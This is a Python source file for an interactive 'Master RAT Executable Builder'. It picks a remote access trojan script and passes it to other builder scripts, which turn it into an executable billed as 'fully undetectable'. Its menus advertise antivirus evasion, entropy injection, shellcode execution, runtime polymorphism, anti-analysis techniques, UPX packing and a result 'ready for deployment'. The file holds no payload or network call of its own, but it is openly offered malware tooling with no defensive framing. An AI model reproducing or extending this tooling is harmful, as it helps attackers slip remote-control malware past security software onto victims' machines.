#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
    MASTER RAT EXECUTABLE BUILDER v2.0
    Multi-Strategy FUD Executable Generation
    
    Strategies:
    1. PyInstaller - Easy, works everywhere
    2. Nuitka - True C compilation, best FUD
    3. Auto-py-to-exe - GUI builder
    4. Cython - Pure Python to C
═══════════════════════════════════════════════════════════════════════════════
"""

import os
import sys
import subprocess
import json
from pathlib import Path
from datetime import datetime

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

class MasterRATBuilder:
    """Master builder with multiple compilation strategies"""
    
    STRATEGIES = {
        '1': {
            'name': 'PyInstaller',
            'cmd': 'rat_executable_builder.py',
            'pros': ['Fast', 'Works everywhere', 'Good obfuscation'],
            'cons': ['Larger file', 'Easily decompilable'],
            'best_for': 'Quick deployment'
        },
        '2': {
            'name': 'Nuitka (C-Compiled)',
            'cmd': 'nuitka_rat_builder.py',
            'pros': ['True compilation', 'Smallest file', 'Hardest to reverse'],
            'cons': ['Slower build', 'Needs compiler'],
            'best_for': 'Maximum stealth'
        },
        '3': {
            'name': 'Hybrid (PyInstaller + Custom Obfuscation)',
            'cmd': 'hybrid_rat_builder.py',
            'pros': ['Balance speed/size', 'Heavy obfuscation', 'Multi-layer'],
            'cons': ['Complex setup'],
            'best_for': 'Production deployment'
        },
        '4': {
            'name': 'Custom Stub Packer',
            'cmd': 'stub_packer_builder.py',
            'pros': ['Ultra-custom', 'Maximum control', 'Unique signature'],
            'cons': ['Most complex', 'Manual tuning'],
            'best_for': 'Advanced users'
        }
    }
    
    def __init__(self):
        self.rat_source = None
        self.output_name = "rat_payload"
        
    def display_header(self):
        """Display main menu"""
        print(f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║            MASTER RAT EXECUTABLE BUILDER v2.0                                ║
║        Multi-Strategy FUD Executable Generation System                       ║
║                                                                              ║
║  Convert Python RAT → Fully Undetectable Native Executable                   ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
        """)
    
    def select_rat_source(self):
        """Select RAT source file"""
        print(f"\n{Colors.BLUE}[*] Available RAT files:{Colors.END}\n")
        
        rat_files = [
            'rat_ultimate.py',
            'rat_server_fixed.py',
            'rat_server_whatsapp.py',
            'nexus-c2-sample.py'
        ]
        
        for i, rat in enumerate(rat_files, 1):
            if os.path.exists(rat):
                size_kb = os.path.getsize(rat) / 1024
                print(f"  {Colors.GREEN}{i}{Colors.END}. {rat} ({size_kb:.1f} KB)")
            else:
                print(f"  {Colors.RED}{i}{Colors.END}. {rat} (NOT FOUND)")
        
        print(f"\n  {Colors.YELLOW}0{Colors.END}. Enter custom file path")
        
        choice = input(f"\n{Colors.CYAN}Select RAT source [{Colors.GREEN}1-4{Colors.END}]: ").strip()
        
        if choice == '0':
            self.rat_source = input(f"{Colors.CYAN}Enter file path: {Colors.END}").strip()
        elif choice in ['1', '2', '3', '4']:
            self.rat_source = rat_files[int(choice) - 1]
        else:
            print(f"{Colors.RED}✗ Invalid choice{Colors.END}")
            return False
        
        if not os.path.exists(self.rat_source):
            print(f"{Colors.RED}✗ File not found: {self.rat_source}{Colors.END}")
            return False
        
        print(f"{Colors.GREEN}✓ Selected: {self.rat_source}{Colors.END}")
        return True
    
    def select_strategy(self):
        """Display build strategies"""
        print(f"\n{Colors.BLUE}[*] Build Strategies:{Colors.END}\n")
        
        for key, strategy in self.STRATEGIES.items():
            print(f"  {Colors.GREEN}{key}{Colors.END}. {strategy['name']}")
            print(f"     Best for: {strategy['best_for']}")
            print(f"     Pros: {', '.join(strategy['pros'])}")
            print(f"     Cons: {', '.join(strategy['cons'])}\n")
        
        choice = input(f"{Colors.CYAN}Select strategy [1-4]: {Colors.END}").strip()
        
        if choice not in self.STRATEGIES:
            print(f"{Colors.RED}✗ Invalid choice{Colors.END}")
            return None
        
        return choice
    
    def configure_output(self):
        """Configure output settings"""
        print(f"\n{Colors.BLUE}[*] Configuration:{Colors.END}\n")
        
        self.output_name = input(f"{Colors.CYAN}Output executable name [{Colors.YELLOW}rat_payload{Colors.END}]: ").strip() or "rat_payload"
        
        obfuscate = input(f"{Colors.CYAN}Enable maximum obfuscation? [y/N]: {Colors.END}").strip().lower() == 'y'
        pack = input(f"{Colors.CYAN}Enable UPX packing? [y/N]: {Colors.END}").strip().lower() == 'y'
        
        return {
            'output': self.output_name,
            'obfuscate': obfuscate,
            'pack': pack
        }
    
    def show_strategy_details(self, strategy_id):
        """Show detailed information about selected strategy"""
        strategy = self.STRATEGIES[strategy_id]
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}═══ {strategy['name']} ═══{Colors.END}\n")
        
        details = {
            '1': """
PyInstaller Strategy:
  • Converts Python → PyInstaller Bundle
  • Packages with hidden imports
  • Applies code obfuscation
  • Injects entropy for AV evasion
  • Optimal for: Windows targets
  • Build time: 1-3 minutes
  • Output size: 50-150 MB
            """,
            '2': """
Nuitka (C-Compiled) Strategy:
  • True compilation Python → C/C++ → Machine Code
  • No bytecode, pure executable
  • Link-time optimization (LTO)
  • Profile-guided optimization (PGO)
  • Optimal for: Maximum stealth
  • Build time: 5-15 minutes
  • Output size: 20-50 MB
            """,
            '3': """
Hybrid Strategy:
  • Combines PyInstaller + Custom Obfuscation
  • Multi-layer encoding
  • Control flow flattening
  • Dead code injection
  • Entropy manipulation
  • Optimal for: Production deployments
  • Build time: 3-5 minutes
  • Output size: 60-200 MB
            """,
            '4': """
Custom Stub Packer Strategy:
  • Custom .NET stub wrapper
  • Shellcode execution
  • Runtime polymorphism
  • Hardware fingerprinting
  • Anti-analysis techniques
  • Optimal for: Advanced usage
  • Build time: Variable
  • Output size: Minimal + payload
            """
        }
        
        print(details.get(strategy_id, ""))
    
    def execute_build(self, strategy_id, config):
        """Execute selected build strategy"""
        strategy = self.STRATEGIES[strategy_id]
        
        print(f"\n{Colors.GREEN}[✓] Starting build with {strategy['name']}...{Colors.END}\n")
        
        # Build command
        cmd = [
            sys.executable,
            strategy['cmd'],
            self.rat_source,
            '-o', config['output']
        ]
        
        if config['obfuscate'] and strategy_id in ['1', '3']:
            cmd.append('-a')
        
        print(f"{Colors.YELLOW}Command: {' '.join(cmd)}{Colors.END}\n")
        
        try:
            result = subprocess.run(cmd)
            return result.returncode == 0
        except FileNotFoundError:
            print(f"{Colors.RED}✗ Builder script not found: {strategy['cmd']}{Colors.END}")
            return False
        except Exception as e:
            print(f"{Colors.RED}✗ Build error: {e}{Colors.END}")
            return False
    
    def run(self):
        """Main execution flow"""
        self.display_header()
        
        # Step 1: Select RAT
        if not self.select_rat_source():
            return False
        
        # Step 2: Show strategies
        strategy_id = self.select_strategy()
        if not strategy_id:
            return False
        
        # Step 3: Show details
        self.show_strategy_details(strategy_id)
        
        # Step 4: Configure
        config = self.configure_output()
        
        # Step 5: Build
        confirm = input(f"\n{Colors.CYAN}Proceed with build? [Y/n]: {Colors.END}").strip().lower()
        if confirm in ['n', 'no']:
            print(f"{Colors.YELLOW}Build cancelled{Colors.END}")
            return False
        
        success = self.execute_build(strategy_id, config)
        
        if success:
            print(f"\n{Colors.GREEN}{Colors.BOLD}═══ BUILD SUCCESSFUL ═══{Colors.END}")
            print(f"{Colors.GREEN}✓ Executable ready for deployment{Colors.END}\n")
        else:
            print(f"\n{Colors.RED}{Colors.BOLD}═══ BUILD FAILED ═══{Colors.END}")
            print(f"{Colors.RED}✗ Check logs for details{Colors.END}\n")
        
        return success

def main():
    builder = MasterRATBuilder()
    builder.run()

if __name__ == '__main__':
    main()
